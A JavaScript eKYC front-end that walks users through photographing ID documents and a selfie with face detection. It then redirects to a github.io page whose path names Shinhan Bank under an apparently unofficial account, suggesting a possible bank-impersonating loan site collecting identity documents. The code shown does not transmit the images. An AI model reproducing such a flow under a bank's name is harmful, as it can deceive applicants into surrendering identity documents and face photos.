// eKYC Application - Main JavaScript File with Enhanced Security and Error Handling
class EKYCApp {
    constructor() {
        this.currentLanguage = 'vi';
        this.currentStep = 1;
        this.maxSteps = 4;
        this.currentDocType = null;
        this.capturedImages = [];
        this.faceDetectionActive = false;
        this.cameraStream = null;
        this.faceAuthSupported = false;
        this.debugMode = true; // Set to false in production
        
        // SDK Configuration
        this.config = {
            faceAuth: {
                width: 640,
                height: 480,
                facingMode: 'user',
                frameRate: { ideal: 30, max: 30 },
                detectInterval: 100, // ms
                confidenceThreshold: 0.7,
                maxRetries: 3
            },
            debug: this.debugMode,
            fallbackEnabled: true
        };
        
        // Language translations
        this.translations = {
            vi: {
                mainTitle: 'Xác thực giấy tờ',
                mainSubtitle: 'Chọn giấy tờ bạn muốn xác thực',
                idCardText: 'Chứng minh thư, Thẻ căn cước',
                passportText: 'Hộ chiếu',
                licenseText: 'Bằng lái xe',
                otherText: 'Giấy tờ khác',
                modalTitle: 'Hướng dẫn chụp ảnh CMT, CCCD',
                step1Text: 'Bước 1: Chụp mặt trước',
                step2Text: 'Bước 2: Chụp mặt sau',
                instruction1: 'Đưa giấy tờ vào gần camera sao cho 4 góc của giấy tờ trùng với vùng giới hạn',
                instruction2: 'Chụp rõ nét và đầy đủ thông tin trên giấy tờ',
                badExample1: 'Không chụp quá mờ',
                badExample2: 'Không chụp mất góc',
                badExample3: 'Không chụp lóa sáng',
                startBtn: 'BẮT ĐẦU',
                cameraTitle: 'CHỤP MẶT TRƯỚC',
                captureBtnText: 'CHỤP ẢNH',
                uploadBtnText: 'TẢI ẢNH LÊN',
                cameraInstructions: 'Xin vui lòng đặt giấy tờ nằm vừa khung hình chữ nhật, chụp đủ ánh sáng và rõ nét',
                guideLink: 'Hướng dẫn',
                faceTitle: 'XÁC THỰC KHUÔN MẶT',
                faceCaptureBtnText: 'CHỤP ẢNH',
                faceInstructions: 'Đặt khuôn mặt vào khung hình oval và giữ yên',
                loadingText: 'Đang tải mô hình AI...',
                progressStep: 'Bước',
                faceProgressStep: 'Bước 3/4',
                faceDetected: 'Đã phát hiện khuôn mặt',
                faceNotDetected: 'Không phát hiện khuôn mặt',
                positionFace: 'Hãy đặt mặt vào khung oval',
                cameraError: 'Không thể truy cập camera. Vui lòng kiểm tra quyền truy cập.',
                modelLoadError: 'Không thể tải mô hình AI. Vui lòng thử lại.',
                captureSuccess: 'Chụp ảnh thành công!',
                processingImage: 'Đang xử lý ảnh...',
                httpsRequired: 'Yêu cầu HTTPS để sử dụng camera. Vui lòng truy cập qua HTTPS.',
                browserNotSupported: 'Trình duyệt không hỗ trợ camera. Vui lòng sử dụng trình duyệt hiện đại.',
                permissionDenied: 'Quyền truy cập camera bị từ chối. Vui lòng cho phép truy cập camera.',
                deviceNotFound: 'Không tìm thấy camera. Vui lòng kiểm tra thiết bị.',
                fallbackMode: 'Chế độ dự phòng: Sử dụng tải ảnh lên thay vì camera.'
            },
            en: {
                mainTitle: 'Document Verification',
                mainSubtitle: 'Choose the document you want to verify',
                idCardText: 'ID Card, Citizen ID',
                passportText: 'Passport',
                licenseText: 'Driver License',
                otherText: 'Other Documents',
                modalTitle: 'ID Card Photo Guidelines',
                step1Text: 'Step 1: Take front photo',
                step2Text: 'Step 2: Take back photo',
                instruction1: 'Place document close to camera so all 4 corners align with the frame',
                instruction2: 'Take clear and complete photos of document information',
                badExample1: 'Don\'t take blurry photos',
                badExample2: 'Don\'t cut corners',
                badExample3: 'Don\'t take photos with glare',
                startBtn: 'START',
                cameraTitle: 'TAKE FRONT PHOTO',
                captureBtnText: 'TAKE PHOTO',
                uploadBtnText: 'UPLOAD PHOTO',
                cameraInstructions: 'Please place document within the rectangular frame, ensure good lighting and clarity',
                guideLink: 'Guide',
                faceTitle: 'FACE VERIFICATION',
                faceCaptureBtnText: 'TAKE PHOTO',
                faceInstructions: 'Place your face in the oval frame and hold still',
                loadingText: 'Loading AI models...',
                progressStep: 'Step',
                faceProgressStep: 'Step 3/4',
                faceDetected: 'Face detected',
                faceNotDetected: 'No face detected',
                positionFace: 'Please position face in oval frame',
                cameraError: 'Cannot access camera. Please check permissions.',
                modelLoadError: 'Cannot load AI models. Please try again.',
                captureSuccess: 'Photo captured successfully!',
                processingImage: 'Processing image...',
                httpsRequired: 'HTTPS required for camera access. Please access via HTTPS.',
                browserNotSupported: 'Browser does not support camera. Please use a modern browser.',
                permissionDenied: 'Camera permission denied. Please allow camera access.',
                deviceNotFound: 'No camera found. Please check your device.',
                fallbackMode: 'Fallback mode: Using file upload instead of camera.'
            }
        };

        this.init();
    }

    init() {
        this.checkBrowserSupport();
        this.checkHTTPS();
        this.bindEvents();
        this.updateLanguage();
        this.loadFaceDetectionModels();
    }

    // 1. Kiểm tra quyền truy cập Camera
    async checkCameraPermissions() {
        try {
            if (this.debugMode) console.log('Checking camera permissions...');
            
            // Kiểm tra và yêu cầu quyền camera
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    width: this.config.faceAuth.width,
                    height: this.config.faceAuth.height,
                    facingMode: this.config.faceAuth.facingMode
                } 
            });
            
            // Dừng stream test
            stream.getTracks().forEach(track => track.stop());
            
            if (this.debugMode) console.log('Camera permissions granted');
            return true;
            
        } catch (error) {
            this.handleFaceAuthError(error);
            return false;
        }
    }

    // 2. Kiểm tra HTTPS
    checkHTTPS() {
        const isHTTPS = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
        
        if (!isHTTPS) {
            this.showError(this.translations[this.currentLanguage].httpsRequired);
            this.enableFallbackMode();
            return false;
        }
        
        if (this.debugMode) console.log('HTTPS check passed');
        return true;
    }

    // 3. Kiểm tra Browser Support
    checkBrowserSupport() {
        // Kiểm tra browser hỗ trợ
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            this.showError(this.translations[this.currentLanguage].browserNotSupported);
            this.enableFallbackMode();
            return false;
        }

        // Kiểm tra các API cần thiết
        const requiredAPIs = [
            'getUserMedia' in navigator.mediaDevices,
            'getDisplayMedia' in navigator.mediaDevices,
            typeof Promise !== 'undefined',
            typeof fetch !== 'undefined'
        ];

        if (!requiredAPIs.every(api => api)) {
            this.showError(this.translations[this.currentLanguage].browserNotSupported);
            this.enableFallbackMode();
            return false;
        }

        if (this.debugMode) console.log('Browser support check passed');
        this.faceAuthSupported = true;
        return true;
    }

    // 4. Cấu hình SDK đúng cách
    configureFaceAuthSDK() {
        // Ví dụ cấu hình cơ bản
        const config = {
            apiUrl: 'https://api.example.com/face-auth',
            timeout: 30000,
            retryAttempts: this.config.faceAuth.maxRetries,
            confidenceThreshold: this.config.faceAuth.confidenceThreshold,
            debug: this.debugMode,
            fallback: {
                enabled: this.config.fallbackEnabled,
                uploadOnly: !this.faceAuthSupported
            },
            camera: {
                constraints: {
                    video: {
                        width: { ideal: this.config.faceAuth.width },
                        height: { ideal: this.config.faceAuth.height },
                        facingMode: this.config.faceAuth.facingMode,
                        frameRate: this.config.faceAuth.frameRate
                    }
                }
            }
        };

        if (this.debugMode) console.log('SDK configured:', config);
        return config;
    }

    // 5. Kiểm tra DOM Element
    checkDOMElements() {
        // Kiểm tra element tồn tại
        const container = document.getElementById('faceVideoElement');
        if (!container) {
            console.error('Face auth container not found');
            return false;
        }

        // Kiểm tra kích thước container
        const rect = container.getBoundingClientRect();
        if (rect.width === 0 || rect.height === 0) {
            console.error('Face auth container has no dimensions');
            return false;
        }

        if (this.debugMode) console.log('DOM elements check passed');
        return true;
    }

    // 6. Xử lý lỗi phổ biến
    handleFaceAuthError(error) {
        if (this.debugMode) console.error('Face auth error:', error);

        let errorMessage = this.translations[this.currentLanguage].cameraError;

        switch (error.name) {
            case 'NotAllowedError':
            case 'PermissionDeniedError':
                errorMessage = this.translations[this.currentLanguage].permissionDenied;
                break;
            case 'NotFoundError':
            case 'DevicesNotFoundError':
                errorMessage = this.translations[this.currentLanguage].deviceNotFound;
                break;
            case 'NotReadableError':
            case 'TrackStartError':
                errorMessage = 'Camera đang được sử dụng bởi ứng dụng khác';
                break;
            case 'OverconstrainedError':
            case 'ConstraintNotSatisfiedError':
                errorMessage = 'Camera không hỗ trợ cấu hình yêu cầu';
                break;
            case 'NotSupportedError':
                errorMessage = this.translations[this.currentLanguage].browserNotSupported;
                break;
            case 'AbortError':
                errorMessage = 'Truy cập camera bị hủy bỏ';
                break;
            default:
                if (error.message) {
                    errorMessage = error.message;
                }
        }

        this.showError(errorMessage);
        
        // Enable fallback mode for certain errors
        if (['NotAllowedError', 'NotFoundError', 'NotSupportedError'].includes(error.name)) {
            this.enableFallbackMode();
        }
    }

    // 10. Fallback Solution
    enableFallbackMode() {
        // Fallback nếu face auth không hoạt động
        if (!this.faceAuthSupported) {
            this.showError(this.translations[this.currentLanguage].fallbackMode);
            
            // Ẩn camera controls, chỉ hiện upload button
            const captureBtn = document.getElementById('captureBtn');
            const faceCaptureBtn = document.getElementById('faceCaptureBtn');
            
            if (captureBtn) captureBtn.style.display = 'none';
            if (faceCaptureBtn) faceCaptureBtn.style.display = 'none';
            
            // Highlight upload button
            const uploadBtn = document.getElementById('uploadBtn');
            if (uploadBtn) {
                uploadBtn.style.background = '#00d4aa';
                uploadBtn.style.transform = 'scale(1.1)';
            }
        }
    }

    bindEvents() {
        // Language selector
        const languageSelect = document.getElementById('languageSelect');
        if (languageSelect) {
            languageSelect.addEventListener('change', (e) => {
                this.currentLanguage = e.target.value;
                this.updateLanguage();
            });
        }

        // Document cards
        const docCards = document.querySelectorAll('.doc-card');
        docCards.forEach(card => {
            card.addEventListener('click', (e) => {
                const docType = card.getAttribute('data-doc-type');
                this.showInstructionModal(docType);
            });
        });

        // Modal close
        const modalClose = document.getElementById('modalClose');
        if (modalClose) {
            modalClose.addEventListener('click', () => {
                this.hideInstructionModal();
            });
        }

        // Modal overlay close
        const modalOverlay = document.querySelector('.modal-overlay');
        if (modalOverlay) {
            modalOverlay.addEventListener('click', () => {
                this.hideInstructionModal();
            });
        }

        // Start capture button
        const startCapture = document.getElementById('startCapture');
        if (startCapture) {
            startCapture.addEventListener('click', () => {
                this.startDocumentCapture();
            });
        }

        // Camera controls
        const captureBtn = document.getElementById('captureBtn');
        const uploadBtn = document.getElementById('uploadBtn');
        const fileInput = document.getElementById('fileInput');

        if (captureBtn) {
            captureBtn.addEventListener('click', () => {
                this.capturePhoto();
            });
        }

        if (uploadBtn) {
            uploadBtn.addEventListener('click', () => {
                fileInput.click();
            });
        }

        if (fileInput) {
            fileInput.addEventListener('change', (e) => {
                this.handleFileUpload(e);
            });
        }

        // Face capture button
        const faceCaptureBtn = document.getElementById('faceCaptureBtn');
        if (faceCaptureBtn) {
            faceCaptureBtn.addEventListener('click', () => {
                this.captureFacePhoto();
            });
        }

        // Error close
        const errorClose = document.getElementById('errorClose');
        if (errorClose) {
            errorClose.addEventListener('click', () => {
                this.hideError();
            });
        }

        // Guide link
        const guideLink = document.getElementById('guideLink');
        if (guideLink) {
            guideLink.addEventListener('click', (e) => {
                e.preventDefault();
                this.showGuide();
            });
        }
    }

    updateLanguage() {
        const texts = this.translations[this.currentLanguage];
        
        // Update all text elements
        Object.keys(texts).forEach(key => {
            const element = document.getElementById(key);
            if (element) {
                element.textContent = texts[key];
            }
        });

        // Update progress indicator
        this.updateProgressIndicator();
    }

    showInstructionModal(docType) {
        this.currentDocType = docType;
        const modal = document.getElementById('instructionModal');
        const modalTitle = document.getElementById('modalTitle');
        
        if (modal && modalTitle) {
            // Update modal title based on document type
            const texts = this.translations[this.currentLanguage];
            let title = texts.modalTitle;
            
            switch (docType) {
                case 'passport':
                    title = this.currentLanguage === 'vi' ? 'Hướng dẫn chụp ảnh Hộ chiếu' : 'Passport Photo Guidelines';
                    break;
                case 'license':
                    title = this.currentLanguage === 'vi' ? 'Hướng dẫn chụp ảnh Bằng lái xe' : 'Driver License Photo Guidelines';
                    break;
                case 'other':
                    title = this.currentLanguage === 'vi' ? 'Hướng dẫn chụp ảnh Giấy tờ khác' : 'Other Document Photo Guidelines';
                    break;
            }
            
            modalTitle.textContent = title;
            modal.classList.remove('hidden');
            modal.classList.add('fade-in');
        }
    }

    hideInstructionModal() {
        const modal = document.getElementById('instructionModal');
        if (modal) {
            modal.classList.add('fade-out');
            setTimeout(() => {
                modal.classList.add('hidden');
                modal.classList.remove('fade-in', 'fade-out');
            }, 300);
        }
    }

    async startDocumentCapture() {
        this.hideInstructionModal();
        this.showCameraInterface();
        
        // Check camera permissions before initializing
        const hasPermission = await this.checkCameraPermissions();
        if (hasPermission) {
            await this.initializeCamera();
        }
    }

    showCameraInterface() {
        const mainScreen = document.getElementById('mainScreen');
        const cameraInterface = document.getElementById('cameraInterface');
        
        if (mainScreen && cameraInterface) {
            mainScreen.classList.add('hidden');
            cameraInterface.classList.remove('hidden');
            cameraInterface.classList.add('fade-in');
        }

        this.updateCameraTitle();
        this.updateProgressIndicator();
    }

    updateCameraTitle() {
        const cameraTitle = document.getElementById('cameraTitle');
        if (cameraTitle) {
            const texts = this.translations[this.currentLanguage];
            if (this.currentStep === 1) {
                cameraTitle.textContent = this.currentLanguage === 'vi' ? 'CHỤP MẶT TRƯỚC' : 'TAKE FRONT PHOTO';
            } else if (this.currentStep === 2) {
                cameraTitle.textContent = this.currentLanguage === 'vi' ? 'CHỤP MẶT SAU' : 'TAKE BACK PHOTO';
            }
        }
    }

    updateProgressIndicator() {
        const progressIndicator = document.getElementById('progressIndicator');
        if (progressIndicator) {
            const texts = this.translations[this.currentLanguage];
            progressIndicator.textContent = `${texts.progressStep} ${this.currentStep}/${this.maxSteps}`;
        }
    }

    async initializeCamera() {
        try {
            const videoElement = document.getElementById('videoElement');
            if (!videoElement) return;

            const constraints = {
                video: {
                    width: { ideal: 1280 },
                    height: { ideal: 720 },
                    facingMode: 'environment' // Use back camera for document scanning
                }
            };

            this.cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
            videoElement.srcObject = this.cameraStream;
            
            videoElement.addEventListener('loadedmetadata', () => {
                videoElement.play();
            });

        } catch (error) {
            console.error('Camera initialization error:', error);
            this.handleFaceAuthError(error);
        }
    }

    async capturePhoto() {
        try {
            const videoElement = document.getElementById('videoElement');
            const canvasElement = document.getElementById('canvasElement');
            
            if (!videoElement || !canvasElement) return;

            const ctx = canvasElement.getContext('2d');
            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;
            
            ctx.drawImage(videoElement, 0, 0);
            
            // Convert to blob
            canvasElement.toBlob((blob) => {
                this.capturedImages.push({
                    step: this.currentStep,
                    blob: blob,
                    timestamp: Date.now()
                });
                
                this.showSuccess(this.translations[this.currentLanguage].captureSuccess);
                this.nextStep();
            }, 'image/jpeg', 0.8);

        } catch (error) {
            console.error('Photo capture error:', error);
            this.showError('Lỗi khi chụp ảnh. Vui lòng thử lại.');
        }
    }

    async handleFileUpload(event) {
        const file = event.target.files[0];
        if (!file) return;

        try {
            this.capturedImages.push({
                step: this.currentStep,
                file: file,
                timestamp: Date.now()
            });
            
            this.showSuccess(this.translations[this.currentLanguage].captureSuccess);
            this.nextStep();
        } catch (error) {
            console.error('File upload error:', error);
            this.showError('Lỗi khi tải ảnh lên. Vui lòng thử lại.');
        }
    }

    nextStep() {
        this.currentStep++;
        
        if (this.currentStep <= 2) {
            // Continue with document capture (front/back)
            this.updateCameraTitle();
            this.updateProgressIndicator();
        } else if (this.currentStep === 3) {
            // Move to face verification
            this.startFaceVerification();
        } else {
            // Complete the process
            this.completeVerification();
        }
    }

    async startFaceVerification() {
        const cameraInterface = document.getElementById('cameraInterface');
        const faceVerification = document.getElementById('faceVerification');
        
        if (cameraInterface && faceVerification) {
            cameraInterface.classList.add('hidden');
            faceVerification.classList.remove('hidden');
            faceVerification.classList.add('fade-in');
        }

        // Stop document camera
        if (this.cameraStream) {
            this.cameraStream.getTracks().forEach(track => track.stop());
        }

        // Check camera permissions for face verification
        const hasPermission = await this.checkCameraPermissions();
        if (hasPermission && this.checkDOMElements()) {
            await this.initializeFaceCamera();
            this.startFaceDetection();
        }
    }

    async initializeFaceCamera() {
        try {
            const faceVideoElement = document.getElementById('faceVideoElement');
            if (!faceVideoElement) return;

            const constraints = {
                video: {
                    width: { ideal: this.config.faceAuth.width },
                    height: { ideal: this.config.faceAuth.height },
                    facingMode: this.config.faceAuth.facingMode,
                    frameRate: this.config.faceAuth.frameRate
                }
            };

            this.cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
            faceVideoElement.srcObject = this.cameraStream;
            
            faceVideoElement.addEventListener('loadedmetadata', () => {
                faceVideoElement.play();
            });

        } catch (error) {
            console.error('Face camera initialization error:', error);
            this.handleFaceAuthError(error);
        }
    }

    async loadFaceDetectionModels() {
        try {
            this.showLoading(true);
            
            // 7. Debug Steps - Bật debug mode
            const config = {
                debug: this.debugMode,
                modelPath: './models',
                loadTimeout: 30000
            };

            if (this.debugMode) {
                console.log('Loading face detection models with config:', config);
            }
            
            // Load face-api.js models from your existing model files
            await faceapi.nets.tinyFaceDetector.loadFromUri('./models');
            await faceapi.nets.faceLandmark68Net.loadFromUri('./models');
            await faceapi.nets.faceRecognitionNet.loadFromUri('./models');
            await faceapi.nets.faceExpressionNet.loadFromUri('./models');
            
            if (this.debugMode) console.log('Face detection models loaded successfully');
            
        } catch (error) {
            console.error('Model loading error:', error);
            this.showError(this.translations[this.currentLanguage].modelLoadError);
        } finally {
            this.showLoading(false);
        }
    }

    async startFaceDetection() {
        if (!faceapi || this.faceDetectionActive) return;
        
        this.faceDetectionActive = true;
        const faceVideoElement = document.getElementById('faceVideoElement');
        const faceDetectionStatus = document.getElementById('faceDetectionStatus');
        
        const detectFaces = async () => {
            if (!this.faceDetectionActive || !faceVideoElement) return;
            
            try {
                const detections = await faceapi.detectAllFaces(faceVideoElement, new faceapi.TinyFaceDetectorOptions())
                    .withFaceLandmarks()
                    .withFaceExpressions();
                
                if (detections && detections.length > 0) {
                    const confidence = detections[0].detection.score;
                    
                    if (confidence >= this.config.faceAuth.confidenceThreshold) {
                        if (faceDetectionStatus) {
                            faceDetectionStatus.textContent = this.translations[this.currentLanguage].faceDetected;
                            faceDetectionStatus.style.background = 'rgba(0, 212, 170, 0.8)';
                        }
                        this.drawFaceDetections(detections);
                    } else {
                        if (faceDetectionStatus) {
                            faceDetectionStatus.textContent = this.translations[this.currentLanguage].positionFace;
                            faceDetectionStatus.style.background = 'rgba(255, 193, 7, 0.8)';
                        }
                    }
                } else {
                    if (faceDetectionStatus) {
                        faceDetectionStatus.textContent = this.translations[this.currentLanguage].positionFace;
                        faceDetectionStatus.style.background = 'rgba(255, 193, 7, 0.8)';
                    }
                }
                
            } catch (error) {
                console.error('Face detection error:', error);
            }
            
            if (this.faceDetectionActive) {
                setTimeout(detectFaces, this.config.faceAuth.detectInterval);
            }
        };
        
        detectFaces();
    }

    drawFaceDetections(detections) {
        const faceVideoElement = document.getElementById('faceVideoElement');
        const overlay = document.getElementById('faceDetectionOverlay');
        
        if (!overlay || !faceVideoElement) return;
        
        // Clear previous detections
        overlay.innerHTML = '';
        
        // Create canvas for drawing
        const canvas = document.createElement('canvas');
        canvas.width = faceVideoElement.offsetWidth;
        canvas.height = faceVideoElement.offsetHeight;
        canvas.style.position = 'absolute';
        canvas.style.top = '0';
        canvas.style.left = '0';
        canvas.style.pointerEvents = 'none';
        
        overlay.appendChild(canvas);
        
        // Draw detections using face-api.js built-in drawing functions
        const displaySize = { width: faceVideoElement.offsetWidth, height: faceVideoElement.offsetHeight };
        faceapi.matchDimensions(canvas, displaySize);
        
        const resizedDetections = faceapi.resizeResults(detections, displaySize);
        faceapi.draw.drawDetections(canvas, resizedDetections);
        faceapi.draw.drawFaceLandmarks(canvas, resizedDetections);
    }

    async captureFacePhoto() {
        try {
            const faceVideoElement = document.getElementById('faceVideoElement');
            const faceCanvasElement = document.getElementById('faceCanvasElement');
            
            if (!faceVideoElement || !faceCanvasElement) return;

            const ctx = faceCanvasElement.getContext('2d');
            faceCanvasElement.width = faceVideoElement.videoWidth;
            faceCanvasElement.height = faceVideoElement.videoHeight;
            
            ctx.drawImage(faceVideoElement, 0, 0);
            
            // Stop face detection
            this.faceDetectionActive = false;
            
            // Convert to blob
            faceCanvasElement.toBlob((blob) => {
                this.capturedImages.push({
                    step: this.currentStep,
                    blob: blob,
                    timestamp: Date.now(),
                    type: 'face'
                });
                
                this.showSuccess(this.translations[this.currentLanguage].captureSuccess);
                this.nextStep();
            }, 'image/jpeg', 0.8);

        } catch (error) {
            console.error('Face photo capture error:', error);
            this.showError('Lỗi khi chụp ảnh khuôn mặt. Vui lòng thử lại.');
        }
    }

    completeVerification() {
        // Stop camera
        if (this.cameraStream) {
            this.cameraStream.getTracks().forEach(track => track.stop());
        }
        
        this.faceDetectionActive = false;
        
        // Show completion message
        this.showSuccess('Xác thực hoàn tất! Đang chuyển hướng...');
        
        // Redirect to success page after 2 seconds
        setTimeout(() => {
            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html';
        }, 2000);
    }

    resetApplication() {
        this.currentStep = 1;
        this.currentDocType = null;
        this.capturedImages = [];
        this.faceDetectionActive = false;
        
        // Hide all screens except main
        const screens = ['cameraInterface', 'faceVerification', 'instructionModal'];
        screens.forEach(screenId => {
            const screen = document.getElementById(screenId);
            if (screen) {
                screen.classList.add('hidden');
            }
        });
        
        // Show main screen
        const mainScreen = document.getElementById('mainScreen');
        if (mainScreen) {
            mainScreen.classList.remove('hidden');
        }
        
        this.hideError();
    }

    showError(message) {
        const errorMessage = document.getElementById('errorMessage');
        const errorText = document.getElementById('errorText');
        
        if (errorMessage && errorText) {
            errorText.textContent = message;
            errorMessage.classList.remove('hidden');
            
            // Auto hide after 5 seconds
            setTimeout(() => {
                this.hideError();
            }, 5000);
        }
    }

    hideError() {
        const errorMessage = document.getElementById('errorMessage');
        if (errorMessage) {
            errorMessage.classList.add('hidden');
        }
    }

    showSuccess(message) {
        // Create temporary success message
        const successDiv = document.createElement('div');
        successDiv.className = 'error-message'; // Reuse error styling
        successDiv.innerHTML = `
            <div class="error-content" style="background: #28a745;">
                <span class="error-icon">✓</span>
                <span>${message}</span>
            </div>
        `;
        
        document.body.appendChild(successDiv);
        
        setTimeout(() => {
            if (document.body.contains(successDiv)) {
                document.body.removeChild(successDiv);
            }
        }, 3000);
    }

    showLoading(show) {
        const loadingOverlay = document.getElementById('loadingOverlay');
        if (loadingOverlay) {
            if (show) {
                loadingOverlay.classList.remove('hidden');
            } else {
                loadingOverlay.classList.add('hidden');
            }
        }
    }

    showGuide() {
        // Show instruction modal again with current document type
        if (this.currentDocType) {
            this.showInstructionModal(this.currentDocType);
        } else {
            // Default to ID card if no document type selected
            this.showInstructionModal('id-card');
        }
    }
}

// Initialize application when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.eKYCApp = new EKYCApp();
});

// Handle page visibility changes
document.addEventListener('visibilitychange', () => {
    if (document.hidden && window.eKYCApp) {
        // Pause face detection when page is hidden
        window.eKYCApp.faceDetectionActive = false;
    }
});

// Handle page unload
window.addEventListener('beforeunload', () => {
    if (window.eKYCApp && window.eKYCApp.cameraStream) {
        window.eKYCApp.cameraStream.getTracks().forEach(track => track.stop());
    }
});
